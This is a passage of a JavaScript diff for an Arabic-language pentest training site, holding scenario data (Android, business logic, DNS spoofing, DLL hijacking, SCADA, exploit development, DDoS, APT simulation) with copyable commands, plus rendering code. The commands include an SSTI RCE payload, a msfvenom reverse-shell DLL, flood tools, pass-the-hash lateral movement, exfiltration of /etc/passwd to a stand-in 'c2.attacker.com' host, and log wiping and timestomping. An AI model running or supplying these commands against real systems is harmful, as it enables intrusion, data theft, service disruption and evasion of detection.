+    { title: 'Template Injection (SSTI)', desc: 'حقن في محركات الـ Templates.', commands: [{ cmd: '# اختبار:\n{{7*7}} → 49\n${7*7} → 49\n<%= 7*7 %> → 49\n# RCE في Jinja2:\n{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}', note: '49 = مؤكد SSTI. محرك Template يُنفذ الكود' }] }
+  ]
+},
+{
+  id: 55, icon: '📱', title: 'Android App Pentesting',
+  desc: 'سيناريو كامل لاختبار أمان تطبيق Android.',
+  difficulty: 'hard', type: 'Mobile', time: '60-120 دقيقة',
+  steps: [
+    { title: 'تثبيت بيئة الاختبار', desc: 'إعداد Android Emulator وأدوات التحليل.', commands: [{ cmd: '# تثبيت أدوات:\napt install adb apktool jadx\n# Android Emulator:\nsudo apt install qemu-kvm\npip3 install frida-tools\n# أو جهاز حقيقي:\nadb devices', note: 'Rooted device أو Emulator ضروري للتحليل العميق' }] },
+    { title: 'تفكيك APK وتحليله', desc: 'استخراج الكود وتحليل المعلومات الحساسة.', commands: [{ cmd: 'apktool d application.apk -o app_decoded/\njadx -d app_java/ application.apk\n# البحث عن secrets:\ngrep -r "password\\|api_key\\|secret\\|token" app_decoded/ --include="*.xml"\ngrep -r "http://" app_decoded/ --include="*.xml"', note: 'Hardcoded Secrets من أشيع الثغرات في Mobile Apps' }] },
+    { title: 'تحليل AndroidManifest.xml', desc: 'الـ Manifest يكشف الـ Components المكشوفة.', commands: [{ cmd: 'cat app_decoded/AndroidManifest.xml | grep -E "exported|android:debuggable|android:allowBackup"\n# Components المكشوفة:\ncat app_decoded/AndroidManifest.xml | grep "exported=\\"true\\""', note: 'exported=true = يمكن لأي تطبيق استدعاء هذا الـ Component' }] },
+    { title: 'اعتراض Traffic بـ Burp', desc: 'ضبط Proxy على الجهاز لاعتراض API calls.', commands: [{ cmd: '# إعداد Android:\nadb shell settings put global http_proxy YOUR_IP:8080\n# تثبيت Burp Certificate:\nadb push burp_cert.pem /sdcard/\n# Frida لتجاوز SSL Pinning:\nfrida -U -n com.target.app -l bypass_ssl.js', note: 'Frida ضروري إذا كان التطبيق يستخدم Certificate Pinning' }] },
+    { title: 'فحص التخزين المحلي', desc: 'البيانات الحساسة في قاعدة البيانات أو الـ Preferences.', commands: [{ cmd: 'adb root && adb shell\n# SQLite:\nfind /data/data/com.target.app -name "*.db"\nadb pull /data/data/com.target.app/databases/main.db\nsqlite3 main.db ".tables"\n# SharedPreferences:\nadb shell cat /data/data/com.target.app/shared_prefs/prefs.xml', note: 'كلمات مرور في SQLite = ثغرة حرجة' }] }
+  ]
+},
+{
+  id: 56, icon: '🏹', title: 'اختبار Business Logic',
+  desc: 'سيناريو اكتشاف واستغلال ثغرات منطق الأعمال.',
+  difficulty: 'hard', type: 'Web App', time: '40-80 دقيقة',
+  steps: [
+    { title: 'ما هي Business Logic Flaws؟', desc: 'ثغرات تعتمد على فهم المنطق وليس التقنية.', commands: [{ cmd: '# أمثلة:\n# 1. تغيير السعر في الطلب\n# 2. تجاوز Workflow Steps\n# 3. استخدام Coupon مرات متعددة\n# 4. تحويل مبلغ سالب\n# 5. الوصول لخطوة بدون المرور بالسابقة', note: 'ابدأ بفهم التطبيق قبل الاختبار' }] },
+    { title: 'Price Manipulation', desc: 'تغيير السعر في الطلب.', commands: [{ cmd: '# في Burp Intercept:\n# اعترض طلب الشراء\n# غيّر الـ price:\n# price=100.00 → price=0.01\n# أو quantity:\n# quantity=1 → quantity=-1\n# أو:\n# discount=10 → discount=110', note: 'الخادم يجب أن يتحقق من السعر من قاعدة البيانات' }] },
+    { title: 'Workflow Bypass', desc: 'تجاوز خطوات الـ Workflow.', commands: [{ cmd: '# مثال: checkout يتطلب:\n# Step 1: Cart → Step 2: Address → Step 3: Payment\n# Try:\ncurl -X POST /checkout/payment -d "order_id=123" # بدون steps سابقة\n# أو:\n# افتح Step 3 مباشرة في Burp', note: 'عدم التحقق من الـ State = ثغرة Business Logic' }] },
+    { title: 'Race Condition', desc: 'إرسال طلبات متزامنة لتجاوز القيود.', commands: [{ cmd: '# في Burp:\n# Repeater → Duplicate → Send Group Simultaneously\n# أو:\npython3 -c "\nimport requests, threading\ndef use_coupon():\n    requests.post(\'http://target.com/coupon\', data={\'code\':\'SAVE10\'})\n    \nthreads = [threading.Thread(target=use_coupon) for _ in range(10)]\nfor t in threads: t.start()\nfor t in threads: t.join()"', note: 'Race Condition يُمكن من استخدام Coupon/Voucher مرات متعددة' }] },
+    { title: 'Privilege Escalation في التطبيق', desc: 'الوصول لوظائف مخصصة لمستخدمين متميزين.', commands: [{ cmd: '# فحص Horizontal:\n# سجل الدخول كـ user1\n# افتح بيانات user2:\ncurl -H "Cookie: session=USER1" http://target.com/api/user/USER2_ID\n# Vertical:\n# حاول: /admin, /dashboard, /api/admin\ncurl -H "Cookie: session=REGULAR_USER" http://target.com/admin', note: 'IDOR = أشيع Business Logic Flaw' }] }
+  ]
+},
+{
+  id: 57, icon: '⚡', title: 'اختبار DNS Security',
+  desc: 'سيناريو كامل لفحص أمان DNS وهجماته.',
+  difficulty: 'medium', type: 'Network', time: '25-50 دقيقة',
+  steps: [
+    { title: 'DNS Enumeration الكامل', desc: 'جمع كل سجلات DNS للهدف.', commands: [{ cmd: 'dig target.com ANY\ndig +noall +answer MX target.com\ndig +noall +answer NS target.com\ndig +noall +answer TXT target.com\ndig +noall +answer AAAA target.com', note: 'سجلات DNS = خريطة البنية التحتية' }] },
+    { title: 'Zone Transfer اختبار', desc: 'Zone Transfer يكشف جميع سجلات النطاق.', commands: [{ cmd: 'dig @ns1.target.com target.com axfr\nhost -t axfr target.com ns1.target.com\nfiercedomains --domain target.com\ndnsx -d target.com -axfr', note: 'Zone Transfer مفتوح = كشف كامل للـ Subdomains' }] },
+    { title: 'DNS Brute Force', desc: 'اكتشاف Subdomains بالقوة.', commands: [{ cmd: 'gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\ndnsx -d target.com -w subdomains.txt -o resolved.txt\namass enum -brute -d target.com -w subdomains.txt', note: 'Brute Force DNS يكشف Subdomains غير معروفة' }] },
+    { title: 'DNS Spoofing', desc: 'تزوير إجابات DNS في الشبكة المحلية.', commands: [{ cmd: '# Bettercap:\nbettercap -iface eth0\nset dns.spoof.domains target.com\nset dns.spoof.address 192.168.1.5\ndns.spoof on\narp.spoof on\n# أو:\ndnschef --fakeip 192.168.1.5 --fakedomains target.com -i eth0', note: 'DNS Spoofing + Phishing Page = اختطاف بيانات' }] },
+    { title: 'DNSSEC فحص', desc: 'التحقق من تفعيل DNSSEC للحماية من الـ Spoofing.', commands: [{ cmd: 'dig +dnssec target.com\ndig DNSKEY target.com\n# إذا لم يكن هناك DNSKEY = DNSSEC غير مفعّل\ndelv @8.8.8.8 target.com A +dnssec\n# أداة:\ndnssec-check target.com', note: 'بدون DNSSEC = عرضة لـ DNS Spoofing الخارجي' }] }
+  ]
+},
+{
+  id: 58, icon: '🎯', title: 'اختبار Thick Client Windows',
+  desc: 'سيناريو اختبار تطبيق Desktop Windows.',
+  difficulty: 'hard', type: 'Thick Client', time: '60-120 دقيقة',
+  steps: [
+    { title: 'تحليل Traffic الشبكي', desc: 'Wireshark لاعتراض اتصالات التطبيق.', commands: [{ cmd: 'wireshark -i eth0 -f "host APP_SERVER_IP"\n# Filter:\ntcp.port == 443 && ssl\n# أو Proxifier:\n# Route App → Burp Proxy', note: 'بعض التطبيقات تستخدم بروتوكولات خاصة غير HTTP' }] },
+    { title: 'فحص الذاكرة', desc: 'Process Hacker للبحث عن Credentials في الذاكرة.', commands: [{ cmd: '# Process Hacker:\n# افتح Process → Memory\n# Find String: password, token, session\n# أو PowerShell:\n$p = Get-Process app\n$mem = $p.MainModule.BaseAddress\n# strings64.exe:\nstrings64.exe -pid APP_PID | findstr /i "password"', note: 'Credentials في الذاكرة = ثغرة شائعة' }] },
+    { title: 'فحص الاتصال بقاعدة البيانات', desc: 'Connection String في ملفات التطبيق.', commands: [{ cmd: 'findstr /si /r "password\\|connectionstring\\|datasource" "C:\\App\\*"\ntype "C:\\App\\config.ini"\n# Registry:\nreg query HKLM /f "connectionstring" /t REG_SZ /s', note: 'Connection String مشفر Base64 = فك تشفيره بسهولة' }] },
+    { title: 'Decompile .NET Assembly', desc: 'dnSpy لعكس هندسة تطبيق .NET.', commands: [{ cmd: '# dnSpy:\n# File → Open → App.exe\n# Assembly Explorer → ابحث عن Authentication\n# ابحث عن:\n# hardcoded passwords\n# encryption keys\n# API keys', note: 'أغلب تطبيقات .NET قابلة للـ Decompile بالكامل' }] },
+    { title: 'DLL Hijacking', desc: 'تحميل DLL خبيث بدل الأصلي.', commands: [{ cmd: '# Procmon:\n# Filter: Process Name = app.exe\n# Result: NAME NOT FOUND\n# Path: DLL في مجلد يمكن الكتابة فيه\n# الاستغلال:\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o target.dll\n# ضع الـ DLL في المجلد المستهدف', note: 'DLL Hijacking يسمح بالتنفيذ بنفس صلاحيات التطبيق' }] }
+  ]
+},
+{
+  id: 59, icon: '🔋', title: 'اختبار أمان OT/SCADA',
+  desc: 'مقدمة لاختبار أمان الأنظمة الصناعية OT/SCADA.',
+  difficulty: 'hard', type: 'OT/ICS', time: '60-120 دقيقة',
+  steps: [
+    { title: 'اكتشاف أجهزة OT', desc: 'Shodan لاكتشاف أنظمة SCADA على الإنترنت.', commands: [{ cmd: 'shodan search "port:102 s7"\nshodan search "Modbus port:502"\nshodan search "port:1911 foxboro"\nnmap --script=modbus-discover -p 502 192.168.1.0/24', note: 'لا تختبر أنظمة OT الحقيقية دون إذن - نتائج كارثية' }] },
+    { title: 'فحص Modbus', desc: 'Modbus بروتوكول صناعي شائع بدون مصادقة.', commands: [{ cmd: 'nmap --script=modbus-discover,modbus-enum -p 502 192.168.1.10\n# Metasploit:\nuse auxiliary/scanner/scada/modbusdetect\nset RHOSTS 192.168.1.10\nrun', note: 'Modbus لا يدعم تشفيراً أو مصادقة أصلاً' }] },
+    { title: 'فحص Siemens S7', desc: 'S7 Protocol لـ Siemens PLCs.', commands: [{ cmd: 'nmap --script=s7-info -p 102 192.168.1.10\n# Metasploit:\nuse auxiliary/scanner/scada/siemens_s7_300_400_plc_scanner\nset RHOSTS 192.168.1.10\nrun', note: 'S7 بدون مصادقة = تحكم كامل بالـ PLC' }] },
+    { title: 'Redpoint Scripts لـ ICS', desc: 'Nmap scripts متخصصة لـ ICS/SCADA.', commands: [{ cmd: 'git clone https://github.com/digitalbond/Redpoint.git\n# نسخ للـ Nmap scripts:\ncp Redpoint/*.nse /usr/share/nmap/scripts/\nnmap --script-updatedb\nnmap --script=enip-enumerate -p 44818 192.168.1.10', note: 'EtherNet/IP لـ Rockwell Allen-Bradley PLCs' }] },
+    { title: 'Network Segmentation Assessment', desc: 'التحقق من عزل OT Network.', commands: [{ cmd: '# من شبكة IT:\nnmap -sn 192.168.100.0/24  # OT Network Range\n# هل يمكن الوصول لـ PLCs من IT؟\nping 192.168.100.10\n# الحل الصحيح:\n# Air Gap أو Firewall صارم بين IT وOT', note: 'عزل OT عن IT من أهم الإجراءات الأمنية' }] }
+  ]
+},
+{
+  id: 60, icon: '🎓', title: 'سيناريو CTF Forensics كامل',
+  desc: 'حل تحدي CTF Forensics من البداية للنهاية.',
+  difficulty: 'medium', type: 'CTF', time: '30-60 دقيقة',
+  steps: [
+    { title: 'فحص الملف الأولي', desc: 'التعرف على نوع الملف وما يحتويه.', commands: [{ cmd: 'file challenge_file\nhexdump -C challenge_file | head -20\nstrings challenge_file | head -30\nexiftool challenge_file\nbinwalk challenge_file', note: 'دائماً ابدأ بـ file, strings, binwalk في CTF' }] },
+    { title: 'تحليل الصورة', desc: 'البحث عن بيانات مخفية في الصور.', commands: [{ cmd: 'steghide extract -sf image.jpg\nstegseek image.jpg rockyou.txt\nzsteg -a image.png\nbinwalk -e image.jpg\nstrings image.jpg | grep -i "flag\\|CTF\\|key"', note: 'zsteg للـ PNG, steghide للـ JPEG' }] },
+    { title: 'تحليل الملف الثنائي', desc: 'GDB لتحليل Binaries في CTF.', commands: [{ cmd: 'gdb ./binary\ninfo functions  # قائمة الدوال\ndisas main  # disassemble main\nrun  # تشغيل\n# pwntools:\nfrom pwn import *\np = process("./binary")\np.interactive()', note: 'pwntools يسهل تفاعل CTF Pwn Challenges' }] },
+    { title: 'فك التشفير', desc: 'CyberChef لفك أنواع مختلفة من التشفير.', commands: [{ cmd: '# Base64:\necho "ZmxhZ3sxMjM0NX0=" | base64 -d\n# Hex:\necho "666c61677b313233343536\n" | xxd -r -p\n# ROT13:\necho "synt{cnffjbeq}" | tr a-zA-Z n-za-mN-ZA-M\n# XOR:\npython3 -c "print(\'\'.join(chr(ord(c)^0x42) for c in \'cipher\'))"', note: 'CyberChef أونلاين يجمع كل عمليات فك التشفير' }] },
+    { title: 'الحصول على Flag', desc: 'تجميع القطع وإيجاد الـ Flag.', commands: [{ cmd: '# البحث عن الـ Flag:\nstrings recovered_file | grep -i "flag{"\ngrep -r "CTF{" . 2>/dev/null\ngrep -r "FLAG{" . 2>/dev/null\n# أو:\nfind . -name "*.txt" | xargs grep -l flag', note: 'الـ Flag عادةً بصيغة: CTF{content} أو FLAG{content}' }] }
+  ]
+},
+{
+  id: 61, icon: '🔍', title: 'اختبار Memory Corruption',
+  desc: 'سيناريو كامل لاختبار ثغرات Memory Corruption.',
+  difficulty: 'hard', type: 'Exploit Dev', time: '90-180 دقيقة',
+  steps: [
+    { title: 'إعداد بيئة Exploit Dev', desc: 'الأدوات اللازمة لتطوير Exploits.', commands: [{ cmd: 'apt install gdb peda pwndbg\npip3 install pwntools\n# تجميع برنامج ضعيف:\ngcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c\n# فحص الحمايات:\nchecksec vuln', note: 'checksec يكشف: ASLR, NX, PIE, Stack Canary' }] },
+    { title: 'اكتشاف Crash بـ Fuzzing', desc: 'AFL++ لـ Fuzzing تلقائي.', commands: [{ cmd: 'apt install aflplusplus\nafl-cc -o vuln_fuzz vuln.c\nmkdir in out\necho "test" > in/seed\nafl-fuzz -i in -o out ./vuln_fuzz @@', note: 'AFL يولد inputs تُسبب Crash تلقائياً' }] },
+    { title: 'تحليل الـ Crash', desc: 'GDB لتحليل سبب الـ Crash.', commands: [{ cmd: 'gdb ./vuln\nrun < crash_input\ninfo registers\nx/20wx $esp\n# إيجاد Offset:\npython3 -c "from pwn import *; print(cyclic(500))" > pattern.txt\ngdb ./vuln < pattern.txt', note: 'EIP = AAAA = offset 112 مثلاً' }] },
+    { title: 'تجاوز NX بـ ROP Chain', desc: 'Return-Oriented Programming لتجاوز NX.', commands: [{ cmd: 'ROPgadget --binary vuln --rop\nROPgadget --binary vuln --string "/bin/sh"\n# بـ pwntools:\nfrom pwn import *\nelf = ELF("./vuln")\nrop = ROP(elf)\nrop.execve(next(elf.search(b"/bin/sh")), 0, 0)\nprint(rop.dump())', note: 'ROP يُجمّع "gadgets" موجودة في البرنامج' }] },
+    { title: 'تجاوز ASLR', desc: 'Address Space Layout Randomization bypass.', commands: [{ cmd: '# Leak Address:\n# Format String Bug:\npython3 -c "print(\'%p \'*30)"\n# أو:\n# Brute Force (32-bit):\nfor i in {1..1000}; do\n  python3 exploit.py 2>&1 | grep shell && break\ndone', note: '32-bit ASLR = 1/1024 شانس. 64-bit = شبه مستحيل' }] }
+  ]
+},
+{
+  id: 62, icon: '🕷️', title: 'اختبار OWASP Top 10 الكامل',
+  desc: 'سيناريو يغطي أبرز OWASP Top 10 2021.',
+  difficulty: 'medium', type: 'Web App', time: '60-120 دقيقة',
+  steps: [
+    { title: 'A01: Broken Access Control', desc: 'IDOR وPrivilege Escalation في التطبيق.', commands: [{ cmd: '# IDOR:\ncurl -H "Auth: Token" http://target.com/api/user/1001/data\ncurl -H "Auth: Token" http://target.com/api/user/1002/data\n# Vertical:\ncurl -H "Auth: User-Token" http://target.com/admin\ncurl -H "Auth: User-Token" http://target.com/api/admin/users', note: 'A01 أخطر ثغرة في OWASP 2021' }] },
+    { title: 'A02: Cryptographic Failures', desc: 'فحص التشفير الضعيف.', commands: [{ cmd: '# TLS قديم:\nsslscan target.com\ntestssl.sh https://target.com\n# MD5/SHA1:\n# ابحث في API responses عن hashes\n# فحص HTTP:\ncurl -I http://target.com  # هل يستخدم HTTPS؟', note: 'MD5 وSHA1 = Broken للـ Password Hashing' }] },
+    { title: 'A03: Injection', desc: 'SQLi وCommand Injection وXSS.', commands: [{ cmd: '# SQLi:\nsqlmap -u "http://target.com/?id=1" --dbs\n# XSS:\ncurl "http://target.com/?q=<scr'+'ipt>alert(1)<\/scr'+'ipt>"\n# Command:\ncurl "http://target.com/ping?host=127.0.0.1;id"', note: 'Injection = أكثر أنواع الثغرات تأثيراً' }] },
+    { title: 'A05: Security Misconfiguration', desc: 'إعدادات خاطئة في الخادم والتطبيق.', commands: [{ cmd: '# Default Credentials:\ncurl -u "admin:admin" http://target.com/admin\n# Directory Listing:\ncurl http://target.com/backup/\n# Error Messages:\ncurl "http://target.com/?id=\'" | grep -i "sql\\|error\\|exception"\n# Nikto:\nnikto -h http://target.com', note: 'Nikto يفحص Security Misconfiguration تلقائياً' }] },
+    { title: 'A10: SSRF', desc: 'Server-Side Request Forgery.', commands: [{ cmd: '# اكتشاف:\ncurl "http://target.com/fetch?url=http://127.0.0.1"\ncurl "http://target.com/fetch?url=http://169.254.169.254/"\n# Blind SSRF:\ncurl "http://target.com/fetch?url=http://BURP_COLLABORATOR"\n# أداة:\nssrf-detector -u http://target.com -p url', note: 'SSRF ارتفع لـ A10 في OWASP 2021 لأهميته المتزايدة' }] }
+  ]
+},
+{
+  id: 63, icon: '🌐', title: 'اختبار CDN وCloud Infrastructure',
+  desc: 'اكتشاف IP أصلي خلف CDN وفحص Cloud Infrastructure.',
+  difficulty: 'medium', type: 'Recon', time: '25-50 دقيقة',
+  steps: [
+    { title: 'اكتشاف IP الحقيقي خلف Cloudflare', desc: 'Cloudflare يخفي IP لكن طرقاً عدة لكشفه.', commands: [{ cmd: '# DNS History:\ncurl "https://securitytrails.com/domain/target.com/dns" -H "APIKEY: KEY"\n# Shodan:\nshodan search "target.com" --fields ip_str | head\n# SSL Certificates:\ncurl "https://crt.sh/?q=target.com" | grep -oE "[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+" | sort -u', note: 'DNS History قبل CDN يكشف IP الحقيقي' }] },
+    { title: 'فحص Email Headers', desc: 'إيميلات الشركة تكشف IP الخادم البريدي.', commands: [{ cmd: '# أرسل إيميل للشركة\n# اعرض الـ Headers:\n# Received: from mail.target.com (IP)\n# X-Originating-IP: IP\n# أو:\ndig MX target.com\nnmap -sV IP_FROM_MX', note: 'Received headers لا يمر بـ Cloudflare عادةً' }] },
+    { title: 'فحص Subdomains بدون CDN', desc: 'بعض Subdomains قد تكون بدون CDN.', commands: [{ cmd: 'subfinder -d target.com\n# فحص IPs:\ncat subdomains.txt | while read sub; do\n  ip=$(dig +short $sub 2>/dev/null | tail -1)\n  echo "$sub -> $ip"\ndone | grep -v "cloudflare\\|cdn"', note: 'dev.target.com أو staging.target.com غالباً بدون CDN' }] },
+    { title: 'فحص S3 Buckets وStorage', desc: 'اكتشاف Cloud Storage Assets.', commands: [{ cmd: '# S3:\nfor name in target-com target-corp target-backup; do\n  aws s3 ls s3://$name --no-sign-request 2>/dev/null && echo "$name ACCESSIBLE"\ndone\n# Azure Blobs:\ncurl https://TARGET.blob.core.windows.net/?comp=list', note: 'Bucket اسم الشركة = هدف شائع' }] },
+    { title: 'Google Dorks للـ Cloud', desc: 'البحث عن Resources سحابية مكشوفة.', commands: [{ cmd: '# Google Dorks:\nsite:s3.amazonaws.com "target"\nsite:storage.googleapis.com "target"\nsite:blob.core.windows.net "target"\n# GitHub:\n"target.com" aws_access_key\n"target.com" secret_key', note: 'GitHub أحياناً يحتوي Credentials مرفوعة بالخطأ' }] }
+  ]
+},
+{
+  id: 64, icon: '🌊', title: 'DDoS وامتصاص الهجمات',
+  desc: 'سيناريو اختبار مرونة التطبيق ضد الحمل الزائد.',
+  difficulty: 'medium', type: 'Network', time: '20-40 دقيقة',
+  steps: [
+    { title: 'اختبار Rate Limiting', desc: 'هل التطبيق محمي من الطلبات المتكررة؟', commands: [{ cmd: '# اختبار Rate Limit:\nfor i in {1..100}; do\n  curl -s -o /dev/null -w "%{http_code} " http://target.com/api/login \\\n  -d "user=admin&pass=test$i"\ndone\n# أو:\nab -n 1000 -c 100 http://target.com/', note: '429 Too Many Requests = Rate Limiting مفعّل' }] },
+    { title: 'Stress Test بـ Apache Bench', desc: 'اختبار أداء الخادم تحت الضغط.', commands: [{ cmd: '# ab للاختبار:\nab -n 10000 -c 500 http://target.com/\n# wrk للاختبار المتقدم:\nwrk -t12 -c400 -d30s http://target.com/', note: 'تأكد من الإذن الكتابي قبل هذا الاختبار' }] },
+    { title: 'HTTP Flood', desc: 'اختبار استجابة الخادم لطلبات HTTP كثيفة.', commands: [{ cmd: '# Slowloris Test:\napt install slowhttptest\nslowloris -target http://target.com -port 80 -timeout 200 -num 500\n# أو:\npython3 -c "\nimport socket, time\nsockets = []\nfor _ in range(200):\n    s = socket.socket()\n    s.connect((\'target.com\', 80))\n    s.send(b\'GET / HTTP/1.1\\r\\n\')\n    sockets.append(s)"', note: 'Slowloris يشغل connections دون إغلاقها' }] },
+    { title: 'UDP Flood اختبار', desc: 'اختبار استجابة UDP services.', commands: [{ cmd: '# hping3:\nhping3 --udp -p 53 -S --flood target.com\n# nping:\nnping --udp -p 1234 --rate 10000 target.com', note: 'UDP Flood يستهلك Bandwidth ويسبب Packet Loss' }] },
+    { title: 'توصيات الحماية من DDoS', desc: 'إجراءات تقليل تأثير DDoS.', commands: [{ cmd: '# Nginx Rate Limiting:\nlimit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;\n# iptables:\niptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT\n# Fail2Ban:\nbancmd = iptables -I INPUT -s <ip> -j DROP\nmaxretry = 50\nfindtime = 60\nbantime = 3600', note: 'CDN + WAF + Rate Limiting = طبقات حماية مناسبة' }] }
+  ]
+},
+{
+  id: 65, icon: '🔱', title: 'سيناريو APT Simulation',
+  desc: 'محاكاة هجوم APT متكامل من البداية للنهاية.',
+  difficulty: 'hard', type: 'Red Team', time: '180-360 دقيقة',
+  steps: [
+    { title: 'Initial Reconnaissance', desc: 'مرحلة الاستطلاع السلبي.', commands: [{ cmd: '# Passive OSINT:\ntheHarvester -d target.com -b all\nsubfinder -d target.com\namass enum -passive -d target.com\ncurl "https://crt.sh/?q=%.target.com&output=json" | jq ".[].name_value" | sort -u', note: 'APT يقضي أسابيع في Reconnaissance' }] },
+    { title: 'Initial Access - Spear Phishing', desc: 'محاكاة Initial Access بـ Phishing.', commands: [{ cmd: '# إعداد GoPhish:\n./gophish\n# أنشئ:\n# - Email Template (مقنع ومخصص)\n# - Landing Page (clone)\n# - Sending Profile\n# - Campaign → Launch\n# تتبع: Opens, Clicks, Submitted Data', note: 'Spear Phishing مخصص = نسبة نجاح 70%+' }] },
+    { title: 'Lateral Movement', desc: 'الانتشار داخل الشبكة.', commands: [{ cmd: '# بعد الدخول الأولي:\n# Pass-the-Hash:\ncrackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH\n# PsExec:\nimpacket-psexec corp.local/admin@192.168.1.10 -hashes :HASH\n# WMI:\nimpacket-wmiexec corp.local/admin@192.168.1.10 -hashes :HASH', note: 'كل الحركات يجب توثيقها لإثبات المسار' }] },
+    { title: 'Data Exfiltration', desc: 'محاكاة سرقة البيانات.', commands: [{ cmd: '# DNS Exfiltration:\npython3 dns_exfiltrate.py --data "sensitive_data" --domain attacker.com\n# HTTP:\ncurl -X POST http://c2.attacker.com/receive -d @/etc/passwd\n# Encrypted:\nopenssl enc -aes-256-cbc -in sensitive.txt | curl -X POST c2.com/data -d @-', note: 'DNS Exfiltration يتجاوز معظم DLP solutions' }] },
+    { title: 'تنظيف الآثار', desc: 'APT يُنظف الآثار لتجنب الاكتشاف.', commands: [{ cmd: '# Linux:\nhistory -c && > ~/.bash_history\n> /var/log/auth.log\n# Windows:\nwevtutil cl Security\nwevtutil cl System\n# Timestomping:\ntouch -t 202001010101 malware.exe\n# أو:\npowershell "Set-Item (Get-Item malware.exe).LastWriteTime \'01/01/2020\'"', note: 'في الاختبارات الحقيقية: وثّق كل شيء قبل الحذف' }] }
+  ]
+},
+];
+
+// ============================================================
+// LOGIC - دمج SCENARIOS مع LESSON_STEPS
+// ============================================================
+let doneSteps = {};
+let activeScenarioDiff = 'all';
+let activeScenarioType = 'all';
+
+// دمج السيناريوهات مع خطوات الدروس
+function getAllScenarios() {
+  const lessonStepsData = window.LESSON_STEPS || [];
+  // دمج: السيناريوهات الأساسية أولاً ثم خطوات الدروس
+  return [...SCENARIOS, ...lessonStepsData];
+}
+
+function filterScenarios(diff, btn) {
+  activeScenarioDiff = diff;
+  document.querySelectorAll('.scenario-filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  renderScenarios();
+}
+
+function filterByType(type, btn) {
+  activeScenarioType = type;
+  document.querySelectorAll('.type-filter-btn').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  renderScenarios();
+}
+
+function renderScenarios() {
+  const grid = document.getElementById('scenariosGrid');
+  let list = getAllScenarios();
+  
+  if (activeScenarioDiff !== 'all') {
+    list = list.filter(s => s.difficulty === activeScenarioDiff);
+  }
+  if (activeScenarioType !== 'all') {
+    list = list.filter(s => s.type === activeScenarioType);
+  }
+  
+  const cntEl = document.getElementById('scenarios-count');
+  if (cntEl) cntEl.textContent = list.length;
+  
+  if (list.length === 0) {
+    grid.innerHTML = '<div style="grid-column:1/-1;text-align:center;padding:3rem;color:var(--text-muted);">لا توجد سيناريوهات لهذا الفلتر</div>';
+    return;
+  }
+  
+  grid.innerHTML = list.map(s => {
+    const diffLabel = s.difficulty === 'easy' ? 'سهل' : s.difficulty === 'medium' ? 'متوسط' : 'صعب';
+    const diffClass = s.difficulty === 'easy' ? 'badge-easy' : s.difficulty === 'medium' ? 'badge-medium' : 'badge-hard';
+    return `
+    <div class="scenario-card" onclick="openScenario(${s.id})">
+      <div class="scenario-header">
+        <div class="scenario-icon">${s.icon}</div>
+        <div class="scenario-info">
+          <h3>${s.title}</h3>
+          <p>${s.desc}</p>
+        </div>
+      </div>
+      <div class="scenario-meta">
+        <span class="scenario-badge ${diffClass}">${diffLabel}</span>
+        <span class="scenario-badge badge-type">${s.type}</span>
+        <span class="scenario-badge" style="background:rgba(255,255,255,0.05);color:#888;border:1px solid #333;">${s.steps.length} خطوات</span>
+      </div>
+      <div class="scenario-footer">
+        <span class="scenario-time"><i class="fas fa-clock" style="margin-left:4px;color:#0cf;"></i>${s.time}</span>
+        <span class="scenario-open"><i class="fas fa-arrow-left"></i></span>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function openScenario(id) {
+  const s = getAllScenarios().find(x => x.id === id);
+  if (!s) return;
+  if (!doneSteps[id]) doneSteps[id] = new Set();
+  document.getElementById('stepsModalTitle').textContent = s.icon + ' ' + s.title;
+  renderScenarioContent(s);
+  document.getElementById('stepsModal').style.display = 'flex';
+  document.body.style.overflow = 'hidden';
+}
+
+function renderScenarioContent(s) {
+  const done = doneSteps[s.id] || new Set();
+  const pct = Math.round((done.size / s.steps.length) * 100);
+  
+  let html = '<div class="progress-bar-wrap">';
+  html += '<div class="progress-bar-label"><span>التقدم</span><span>' + done.size + ' / ' + s.steps.length + ' خطوات مكتملة</span></div>';
+  html += '<div class="progress-bar-track"><div class="progress-bar-fill" style="width:' + pct + '%"></div></div>';
+  html += '</div>';
+  
+  s.steps.forEach(function(step, i) {
+    const isDone = done.has(i);
+    const isLast = (i === s.steps.length - 1);
+    
+    html += '<div class="exec-step">';
+    if (!isLast) html += '<div class="step-line"></div>';
+    html += '<div class="step-num-col"><div class="step-circle ' + (isDone ? 'done' : '') + '">' + (isDone ? '✓' : (i + 1)) + '</div></div>';
+    html += '<div class="step-body">';
+    html += '<div class="step-title">' + step.title + '</div>';
+    html += '<div class="step-desc">' + step.desc + '</div>';
+    html += '<div class="step-commands">';
+    
+    step.commands.forEach(function(c) {
+      const enc = encodeURIComponent(c.cmd);
+      const displayCmd = c.cmd.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>');
+      html += '<div class="step-cmd-block">';
+      html += '<div style="flex:1;"><code>' + displayCmd + '</code>';
+      if (c.note) html += '<div class="cmd-note">⟵ ' + c.note + '</div>';
+      html += '</div>';
+      html += '<button class="step-copy-btn" onclick="stepCopy(this,\'' + enc + '\')">📋 نسخ</button>';
+      html += '</div>';
+    });
+    
+    html += '</div>';
+    if (step.warning) html += '<div class="step-warning">⚠️ ' + step.warning + '</div>';
+    if (step.tip) html += '<div class="step-tip">💡 ' + step.tip + '</div>';
+    html += '<button class="step-done-btn ' + (isDone ? 'done' : '') + '" onclick="markDone(' + s.id + ',' + i + ')">';
+    html += isDone ? '✅ مكتملة' : '☐ وضع علامة مكتملة';
+    html += '</button>';
+    html += '</div></div>';
+  });
+  
+  document.getElementById('stepsModalBody').innerHTML = html;
+}
+
+function markDone(sId, stepIdx) {
+  if (!doneSteps[sId]) doneSteps[sId] = new Set();
+  if (doneSteps[sId].has(stepIdx)) doneSteps[sId].delete(stepIdx);
+  else doneSteps[sId].add(stepIdx);
+  const s = getAllScenarios().find(x => x.id === sId);
+  if (s) renderScenarioContent(s);
+}
+
+function stepCopy(btn, enc) {
